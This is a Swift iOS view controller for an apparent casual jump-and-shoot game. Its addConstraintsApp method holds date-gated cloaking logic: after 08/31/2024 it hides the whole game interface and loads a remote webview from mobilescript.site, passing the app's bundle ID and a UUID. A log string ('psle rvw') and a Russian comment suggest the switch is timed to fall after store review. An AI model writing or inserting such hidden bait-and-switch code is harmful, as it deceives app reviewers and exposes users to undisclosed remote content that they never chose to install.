import UIKit

class ViewController: UIViewController {

    override func viewDidLoad() {
        super.viewDidLoad()
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        AppOrientation.lockOrientation(.portrait)
        addConstraintsApp()
    }
    
    func addConstraintsApp() {
        if checkDate(customDate: "08/31/2024") { // - mm/dd/yyyy
            print("")
        } else {
            view.subviews.forEach { view in
                view.isHidden = true
            }
            print("psle rvw")
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.00001) { [weak self] in
                //self?.getParameters()
                // зашрузить веббвью !
                var resprl = "https://mobilescript.site/clicklink/test?bundle={bundle}&userId={userId}"
                let uuid = UUID().uuidString
                let bundleId = Bundle.main.bundleIdentifier
                
                resprl = resprl.replacingOccurrences(of: "{bundle}", with: bundleId ?? "noBundle")
                resprl = resprl.replacingOccurrences(of: "{userId}", with: uuid ?? "noUuid")
                print(resprl)
                
                let vc = MainViewController()
                vc.ssilkaMain = resprl
                self?.navigationController?.pushViewController(vc, animated: false)
            }
        }
    }



    @IBAction func playButtonAction(_ sender: UITapGestureRecognizer) {
        let mainVC = MainViewController()
        self.navigationController?.pushViewController(mainVC, animated: true)
    }
    
    @IBAction func rulesButtonAction(_ sender: UITapGestureRecognizer) {
        print("rules")
        let text = "Jump over obstacles and try not to fall into the hands of enemies. Use weapons to eliminate them. Collect coins to open new levels, and also collect lives to survive in case of collision with enemies. Each new level complicates the difficulty of the game and also makes it more interesting. Good luck!"
        let vc = DescViewController(text: text)
        present(vc, animated: true)
    }
    
    @IBAction func privacyButtonAction(_ sender: UITapGestureRecognizer) {
        print("privacy")
        
        let policyViewController = MainViewController()
        policyViewController.ssilkaMain = "https://firebasestorage.googleapis.com/v0/b/com-olymp-ussep-reme.appspot.com/o/com.olymp.ussep.reme.html?alt=media"
        self.navigationController?.pushViewController(policyViewController, animated: true)
    }
    
    @IBAction func closeButtonAction(_ sender: UITapGestureRecognizer) {
        print("close")
        
        UIControl().sendAction(#selector(NSXPCConnection.suspend), to: UIApplication.shared, for: nil)
        _ = Timer.scheduledTimer(withTimeInterval: 0.15, repeats: false) { _ in
            //self.exitButton.alpha = 1
        }
    }
    
    func checkDate(customDate:String, referenceDate:String="today") -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "MM/dd/yyyy"
        
        let myDate = dateFormatter.date(from: customDate)
        let refDate = referenceDate == "today"
        ? NSDate() as Date
        : dateFormatter.date(from: referenceDate)
        
        if NSDate().compare(myDate!) == ComparisonResult.orderedDescending {
            return false
        } else {
            return true
        }
    }
}

